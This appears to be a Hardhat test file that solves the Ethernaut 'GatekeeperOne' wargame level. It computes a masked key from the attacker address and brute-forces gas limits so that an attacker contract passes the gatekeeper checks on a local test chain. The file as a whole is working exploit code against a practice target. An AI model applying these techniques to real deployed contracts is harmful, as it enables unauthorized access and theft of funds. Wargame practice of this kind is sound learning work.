import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { BigNumber, ContractTransaction } from "ethers";
import { ethers } from "hardhat";
import { GatekeeperOne, GatekeeperOneAttacker } from "typechain-types";

// Challenge description

// Make it past the gatekeeper and register as an entrant to pass this level.

// Things that might help:
// Remember what you've learned from the Telephone and Token levels.
// You can learn more about the special function gasleft()

describe("Ethernaut - GatekeeperOne", async () => {
  let gatekeeperOne: GatekeeperOne;
  let gatekeeperOneAttacker: GatekeeperOneAttacker;
  let owner: SignerWithAddress, attacker: SignerWithAddress;

  before(async () => {
    [owner, , attacker] = await ethers.getSigners();
    gatekeeperOne = await ethers
      .getContractFactory("GatekeeperOne", owner)
      .then((f) => f.deploy());
    gatekeeperOneAttacker = await ethers
      .getContractFactory("GatekeeperOneAttacker", attacker)
      .then((f) => f.deploy());
  });

  it("Hacks", async () => {
    expect(await gatekeeperOne.entrant()).equal(ethers.constants.AddressZero);

    const mask = BigNumber.from("0xffffffff0000ffff").toBigInt();

    const key = ethers.utils.hexValue(
      BigNumber.from(
        ethers.utils.hexDataSlice(attacker.address, 12, 20),
      ).toBigInt() & mask,
    );

    const bruteForce = (
      gasLimit: BigNumber,
    ): Promise<ContractTransaction | undefined> =>
      gatekeeperOneAttacker
        .connect(attacker)
        .populateTransaction.attackGatekeeperOne(gatekeeperOne.address, key, {
          gasLimit,
        })
        .then(async (tx) => {
          await ethers.provider.estimateGas(tx);
          tx.gasLimit = gasLimit;
          return attacker.sendTransaction(tx);
        })
        .catch((e) => {
          if (e.reason === "Transaction reverted without a reason string") {
            return bruteForce(gasLimit.add(1));
          }
        });

    await bruteForce(BigNumber.from(201_908));

    expect(await gatekeeperOne.entrant()).equal(attacker.address);
  });
});
